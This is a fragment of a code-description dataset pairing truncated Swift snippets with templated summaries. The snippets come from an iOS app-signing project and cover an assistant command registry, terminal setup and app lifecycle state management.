    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1836",
    "code": "@objc private func signingOperationCompleted(_ notification: Notification) {\nif let appName = notification.userInfo?[\"appName\"] as? String,\nlet success = notification.userInfo?[\"success\"] as? Bool\n{",
    "nl": "Function signingOperationCompleted - implements signingoperationcompleted functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1837",
    "code": "@objc private func sourcesRefreshed(_: Notification) {\nlet sources = CoreDataManager.shared.getAZSources()\n\nlet additionalData: [String: Any] = [\n\"refreshedSources\": sources.map { $0.name ?? \"Unnamed\" },",
    "nl": "Function sourcesRefreshed - implements sourcesrefreshed functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1838",
    "code": "private func registerAdvancedCommands() {\n// Batch signing command\nregisterCommand(\"batch sign\") { [weak self] appNames, completion in",
    "nl": "MARK: - Advanced AI Commands / Registers advanced AI commands for enhanced functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1839",
    "code": "private func updateCommandHistory(command: String, parameter: String) {\ncommandHistory.append((command: command, parameter: parameter, timestamp: Date()))\n\n// Keep only the last 50 commands\nif commandHistory.count > 50 {",
    "nl": "MARK: - Command History and Prediction Command history is now stored in the main AppContextManager class / Updates the command history for better predictions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1840",
    "code": "private func initializePredictiveModel() {\n// Load any saved command history\nif let savedHistory = UserDefaults.standard.object(forKey: \"AICommandHistory\") as? Data {",
    "nl": "/ Initialize the predictive model for command suggestions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1841",
    "code": "private func updatePredictionModel() {\n// Save the command history for future use\nlet historyEntries = commandHistory.map { CommandHistoryEntry(",
    "nl": "/ Update the prediction model with new command history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1842",
    "code": "func getPredictedCommands(currentInput: String) -> [String] {\n// Simple prediction based on command frequency and recency\nvar commandFrequency: [String: Int] = [:]\nvar predictions: [String] = []\n\n// Calculate frequency\nfor entry in commandHistory {",
    "nl": "/ Get predicted commands based on user behavior",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1843",
    "code": "private func performBatchSigning(apps: [String]) {\nfor appName in apps {",
    "nl": "MARK: - Implementation for Advanced Commands / Performs batch signing of multiple apps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1844",
    "code": "private func getSuggestedApps(for category: String, completion: @escaping ([String]) -> Void) {\n// Simulate app suggestions based on category\nvar suggestions: [String] = []\n\nswitch category.lowercased() {",
    "nl": "/ Gets suggested apps based on category and user history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1845",
    "code": "private func performAdvancedSearch(query: String, completion: @escaping ([String]) -> Void) {\n// Simulate advanced search functionality\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\nlet sources = CoreDataManager.shared.getAZSources()\n\n// Combine all searchable items\nvar searchResults: [String] = []\n\n// Search in downloaded apps",
    "nl": "/ Performs advanced search across the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1846",
    "code": "private func processVoiceCommand(_ audioQuery: String) -> String {\n// In a real implementation, this would connect to speech recognition\n// For now, we'll just simulate it by parsing the text directly\n\n// Remove \"process voice\" prefix if present\nvar processedCommand = audioQuery\nif processedCommand.hasPrefix(\"process voice\") {",
    "nl": "/ Processes voice commands (simulated)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1847",
    "code": "struct CommandHistoryEntry: Codable {\nlet command: String\nlet parameter: String\nlet timestamp: Date\n}\n",
    "nl": "MARK: - Supporting Types / Structure for encoding/decoding command history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "struct"
  },
  {
    "id": "1848",
    "code": "protocol ScreenIdentifiable {\nvar screenName: String { get }",
    "nl": "/ Protocol for view controllers to explicitly identify their screen name.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "protocol"
  },
  {
    "id": "1849",
    "code": "final class AppContextManager {\n// Singleton instance\nstatic let shared = AppContextManager()\n\n// Properties\nvar currentState: AppContext? // Refers to AppContext from AppContext.swift\nprivate var commandHandlers: [String: (String, @escaping (String) -> Void) -> Void] = [:]\nprivate let commandQueue = DispatchQueue(label: \"com.app.commandQueue\")\n\n// Command history for AI prediction",
    "nl": "/ Manages the app's context and command execution for the AI assistant.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "class"
  },
  {
    "id": "1850",
    "code": "func updateContext(_ viewController: UIViewController) {\nvar additionalData: [String: Any] = [:]\n\n// Fetch data from CoreDataManager for app state\nlet sources = CoreDataManager.shared.getAZSources()\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\nlet certificates = CoreDataManager.shared.getDatedCertificate()\nlet currentCertificate = CoreDataManager.shared.getCurrentCertificate()\n",
    "nl": "/ Updates the app's context based on the current view controller.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1851",
    "code": "func currentContext() -> AppContext {\nreturn currentState ?? AppContext(currentScreen: \"Unknown\", additionalData: [:])\n}\n\n/// Registers a command with its handler, including a completion callback.\nfunc registerCommand(_ command: String, handler: @escaping (String, @escaping (String) -> Void) -> Void) {",
    "nl": "/ Returns the current app context.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1852",
    "code": "func registerCommand(_ command: String, handler: @escaping (String, @escaping (String) -> Void) -> Void) {\ncommandQueue.sync {",
    "nl": "/ Registers a command with its handler, including a completion callback.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1853",
    "code": "func executeCommand(_ command: String, parameter: String, completion: @escaping (AppCommandResult) -> Void) {\ncommandQueue.sync {",
    "nl": "/ Executes a command with the given parameter and returns the result via completion.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1854",
    "code": "func availableCommands() -> [String] {\ncommandQueue.sync {",
    "nl": "/ Returns a list of available commands.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1855",
    "code": "func setAdditionalContextData(_ data: [String: Any]) {\n// Since AppContext is immutable, create a new instance\nif let current = currentState {",
    "nl": "/ Sets additional context data dynamically.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "function"
  },
  {
    "id": "1856",
    "code": "enum AppCommandResult {\ncase successWithResult(String)\ncase unknownCommand(String)\n}\n\n/// Struct to format app information.\nstruct AppInfo {",
    "nl": "/ Result type for command execution.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1857",
    "code": "struct AppInfo {\nlet name: String\nlet version: String\nvar description: String { \"\\(name) (\\(version))\" }",
    "nl": "/ Struct to format app information.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1858",
    "code": "struct SignedAppInfo {\nlet name: String\nlet bundleIdentifier: String\nlet teamName: String\nvar description: String { \"\\(name) (\\(bundleIdentifier)) - Team: \\(teamName)\" }",
    "nl": "/ Struct to format signed app information.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1859",
    "code": "extension AppDelegate {\n/// Initialize terminal components\nfunc setupTerminal() {",
    "nl": "extension AppDelegate - implements functionality related to app delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1860",
    "code": "func setupTerminal() {\n// Register terminal tab option (default to true for new installs)\nif UserDefaults.standard.object(forKey: \"show_terminal_button\") == nil {",
    "nl": "/ Initialize terminal components",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1861",
    "code": "private func registerTerminalCommands() {\n// Command: open terminal\nAppContextManager.shared.registerCommand(\"open terminal\") { _, completion in",
    "nl": "/ Register terminal-related commands for AI assistant",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1862",
    "code": "func initializeTerminalAfterLaunch() {\n// Delay to allow UI to stabilize\nDispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {",
    "nl": "/ Initialize terminal components after app launch",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1863",
    "code": "func restoreTerminalButtonIfNeeded() {\nif UserDefaults.standard.bool(forKey: \"show_terminal_button\") {",
    "nl": "Call this from applicationDidBecomeActive",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1864",
    "code": "final class AppLifecycleManager {\n// MARK: - Singleton\n\n/// Shared instance\nstatic let shared = AppLifecycleManager()\n\n// MARK: - Properties\n\n/// Current app state\nprivate(set) var appState: AppState = .inactive {",
    "nl": "/ A comprehensive manager for app lifecycle and state preservation / / This class improves app state management during lifecycle events: / 1. Robust state preservation across app backgrounding/foregrounding / 2. Enhanced background task management / 3. Crash recovery and session restoration / 4. Coordinated view state preservation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "class"
  },
  {
    "id": "1865",
    "code": "private func setupObservers() {\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(applicationWillResignActive),\nname: UIApplication.willResignActiveNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(\nself,",
    "nl": "MARK: - Setup / Sets up observation of app lifecycle events",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1866",
    "code": "@objc private func applicationWillResignActive() {\nappState = .inactive\nDebug.shared.log(message: \"App will resign active\", type: .info)\n\n// Save state immediately when app becomes inactive\nsaveApplicationState()\n\n// Notify components to prepare for inactivity\nNotificationCenter.default.post(name: .appWillBecomeInactive, object: nil)\n}",
    "nl": "MARK: - App Lifecycle Handlers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1867",
    "code": "@objc private func applicationDidEnterBackground() {\nappState = .background\nDebug.shared.log(message: \"App did enter background\", type: .info)\n\n// Additional state saving for background mode\nsaveApplicationState()\n\n// Start background tasks that need to continue\nstartBackgroundTasks()\n",
    "nl": "Function applicationDidEnterBackground - implements applicationdidenterbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1868",
    "code": "@objc private func applicationWillEnterForeground() {\nappState = .foreground\nDebug.shared.log(message: \"App will enter foreground\", type: .info)\n\n// Prepare to restore state\nprepareForForeground()\n\n// Notify components about foreground state\nNotificationCenter.default.post(name: .appWillEnterForeground, object: nil)\n}",
    "nl": "Function applicationWillEnterForeground - implements applicationwillenterforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1869",
    "code": "@objc private func applicationDidBecomeActive() {\nappState = .active\nDebug.shared.log(message: \"App did become active\", type: .info)\n\n// Complete state restoration\ncompleteStateRestoration()\n\n// Verify Core Data state is clean\nverifyDataIntegrity()\n",
    "nl": "Function applicationDidBecomeActive - implements applicationdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1870",
    "code": "@objc private func applicationWillTerminate() {\nDebug.shared.log(message: \"App will terminate\", type: .info)\n\n// Final save before termination\nsaveApplicationState(isTerminating: true)\n\n// Cancel any background tasks\ncancelAllBackgroundTasks()\n\n// Notify components about termination",
    "nl": "Function applicationWillTerminate - implements applicationwillterminate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1871",
    "code": "@objc private func didReceiveMemoryWarning() {\nDebug.shared.log(message: \"Memory warning received\", type: .warning)\n\n// Save critical state\nsaveApplicationState()\n\n// Cancel non-essential background tasks\ncancelNonEssentialBackgroundTasks()\n\n// Notify components to reduce memory usage",
    "nl": "Function didReceiveMemoryWarning - implements didreceivememorywarning functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1872",
    "code": "@objc private func tabDidChange(_ notification: Notification) {\nif let tab = notification.userInfo?[\"tab\"] as? String {",
    "nl": "Function tabDidChange - implements tabdidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1873",
    "code": "private func stateDidChange(from oldState: AppState, to newState: AppState) {\nDebug.shared.log(message: \"App state changed from \\(oldState) to \\(newState)\", type: .debug)\n\nswitch (oldState, newState) {",
    "nl": "MARK: - State Change Handling / Called when the app state changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1874",
    "code": "func saveApplicationState(isTerminating: Bool = false) {\nDebug.shared.log(message: \"Saving application state (terminating: \\(isTerminating))\", type: .debug)\n\n// Capture timestamp of save\nlet timestamp = Date()\nlastSaveTimestamp = timestamp\n\n// Create state container\nvar state: [String: Any] = [\n\"timestamp\": timestamp,",
    "nl": "MARK: - State Persistence / Saves the current application state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1875",
    "code": "private func loadPersistedState() {\nDebug.shared.log(message: \"Loading persisted application state\", type: .debug)\n\n// Check for crash recovery\ncheckForCrashRecovery()\n\n// Load saved state\nif let stateData = UserDefaults.standard.data(forKey: \"AppStateData\"),\nlet state = try? JSONSerialization.jsonObject(with: stateData, options: []) as? [String: Any]\n{",
    "nl": "/ Loads the persisted application state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1876",
    "code": "private func saveDataContext(isTerminating _: Bool) {\ndo {",
    "nl": "/ Saves the Core Data context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1877",
    "code": "private func prepareForForeground() {\nDebug.shared.log(message: \"Preparing for foreground\", type: .debug)\n\n// Load any updated state\nloadPersistedState()\n\n// Prepare UI for restoration\nprepareUIForRestoration()\n\n// Notify components to prepare for foreground",
    "nl": "MARK: - State Restoration / Prepares for app returning to foreground",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1878",
    "code": "private func completeStateRestoration() {\nDebug.shared.log(message: \"Completing state restoration\", type: .debug)\n\n// Complete restoration of active tab\nif let selectedTab = UserDefaults.standard.string(forKey: \"selectedTab\") {",
    "nl": "/ Completes state restoration after app becomes active",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1879",
    "code": "private func prepareUIForRestoration() {\nDispatchQueue.main.async {",
    "nl": "/ Prepares UI for restoration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1880",
    "code": "private func completeUIRestoration() {\nDispatchQueue.main.async {",
    "nl": "/ Completes UI restoration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1881",
    "code": "private func saveTabState() {\nif let selectedTab = UserDefaults.standard.string(forKey: \"selectedTab\") {",
    "nl": "MARK: - View State Management / Saves the state of the current tab",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1882",
    "code": "private func restoreTabState(for tab: String) {\n// Check if we have saved state for this tab\nif let tabState = viewStates[\"\\(tab)_viewState\"] {",
    "nl": "/ Restores the state for a specific tab",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1883",
    "code": "private func refreshViewHierarchy(_ viewController: UIViewController) {\n// Make the view controller interactive\nviewController.view.isUserInteractionEnabled = true\n\n// Force layout update\nviewController.view.setNeedsLayout()\nviewController.view.layoutIfNeeded()\n\n// Check if the view controller conforms to our refreshable protocol\n// and call the refresh method directly if it does",
    "nl": "/ Helper method to refresh the entire view hierarchy",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1884",
    "code": "private func applyAppTheme(to viewController: UIViewController) {\n// Apply tint color\nviewController.view.tintColor = Preferences.appTintColor.uiColor\n\n// Apply interface style\nviewController\n.overrideUserInterfaceStyle = UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle) ??\n.unspecified\n\n// Apply to child view controllers",
    "nl": "/ Applies theme to view controller hierarchy",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1885",
    "code": "private func prepareBackgroundTasks() {\nDebug.shared.log(message: \"Preparing background tasks\", type: .debug)\n\n// Make sure Core Data is saved\nsaveDataContext(isTerminating: false)\n}\n\n/// Starts background tasks that need to continue in background\nprivate func startBackgroundTasks() {",
    "nl": "MARK: - Background Tasks / Prepares background tasks when app is about to enter background",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1886",
    "code": "private func startBackgroundTasks() {\n// Start monitoring task for app state\nstartStateMonitoringTask()\n\n// Start tasks for any in-progress operations\nstartTasksForActiveOperations()\n}\n\n/// Starts a background task for monitoring app state\nprivate func startStateMonitoringTask() {",
    "nl": "/ Starts background tasks that need to continue in background",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1887",
    "code": "private func startStateMonitoringTask() {\nvar taskId: UIBackgroundTaskIdentifier = .invalid\n\n// Use captured local variable for task ID to avoid capture-reference cycle\ntaskId = UIApplication.shared.beginBackgroundTask(withName: \"StateMonitoring\") { [weak self, taskId] in",
    "nl": "/ Starts a background task for monitoring app state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1888",
    "code": "private func startTasksForActiveOperations() {\nlet activeOps = getActiveOperations()\n\nfor operation in activeOps {",
    "nl": "/ Starts background tasks for active operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1889",
    "code": "private func cancelDeferrableBackgroundTasks() {\nfor (taskId, taskInfo) in backgroundTasks {",
    "nl": "/ Cancels background tasks that can be deferred",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1890",
    "code": "private func cancelNonEssentialBackgroundTasks() {\nfor (taskId, taskInfo) in backgroundTasks {",
    "nl": "/ Cancels non-essential background tasks (during memory pressure)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1891",
    "code": "private func cancelAllBackgroundTasks() {\nfor (taskId, taskInfo) in backgroundTasks {",
    "nl": "/ Cancels all background tasks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1892",
    "code": "private func getActiveOperations() -> [[String: Any]] {\n// This would be populated with real data from various managers\n// For now, we'll return an empty array\nreturn []\n}\n\n/// Saves state for a specific operation\nprivate func saveOperationState(for operationName: String) {",
    "nl": "MARK: - Operations Management / Gets information about active operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1893",
    "code": "private func saveOperationState(for operationName: String) {\n// Implementation would save specific operation state\nDebug.shared.log(message: \"Saving state for operation: \\(operationName)\", type: .debug)\n}\n\n/// Resumes operations that were active when app went to background\nprivate func resumeOperations(_ operations: [[String: Any]]) {",
    "nl": "/ Saves state for a specific operation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1894",
    "code": "private func resumeOperations(_ operations: [[String: Any]]) {\nfor operation in operations {",
    "nl": "/ Resumes operations that were active when app went to background",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1895",
    "code": "private func checkForCrashRecovery() {\nlet lastSessionEndedCleanly = UserDefaults.standard.bool(forKey: \"SessionEndedCleanly\")\nUserDefaults.standard.set(false, forKey: \"SessionEndedCleanly\")\n\nif !lastSessionEndedCleanly {",
    "nl": "MARK: - Crash Recovery / Checks for signs of a previous crash and attempts recovery",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1896",
    "code": "private func attemptCrashRecovery() {\n// Check Core Data integrity\ndo {",
    "nl": "/ Attempts to recover from a crash",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1897",
    "code": "private func verifyDataIntegrity() {\nprocessingQueue.async {",
    "nl": "/ Verifies data integrity when app becomes active",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1898",
    "code": "private func prepareForInactive() {\n// Mark that the session is ending cleanly\nUserDefaults.standard.set(true, forKey: \"SessionEndedCleanly\")\nUserDefaults.standard.synchronize()\n}\n}\n\n// MARK: - Supporting Types\n\n/// App lifecycle states",
    "nl": "/ Prepares for transitioning to inactive state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1899",
    "code": "enum AppState: String {\ncase inactive = \"Inactive\"\ncase background = \"Background\"\ncase foreground = \"Foreground\"\ncase active = \"Active\"\n}\n\n/// Information about a background task\nstruct BackgroundTaskInfo {",
    "nl": "MARK: - Supporting Types / App lifecycle states",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1900",
    "code": "struct BackgroundTaskInfo {\nlet id: UIBackgroundTaskIdentifier\nlet name: String\nlet startTime: Date\nlet isPriority: Bool\n}\n\n/// Protocol for view controllers that can save and restore state\nprotocol StateSavable {",
    "nl": "/ Information about a background task",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1901",
    "code": "protocol StateSavable {\nfunc saveState() -> Any\nfunc restoreState(_ state: Any)\n}\n\n// MARK: - Notification Extensions\n\nextension Notification.Name {",
    "nl": "/ Protocol for view controllers that can save and restore state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "protocol"
  },
  {
    "id": "1902",
    "code": "func saveState() -> Any\nfunc restoreState(_ state: Any)\n}\n\n// MARK: - Notification Extensions\n\nextension Notification.Name {",
    "nl": "Function saveState - implements savestate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1903",
    "code": "func restoreState(_ state: Any)\n}\n\n// MARK: - Notification Extensions\n\nextension Notification.Name {",
    "nl": "Function restoreState - implements restorestate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1904",
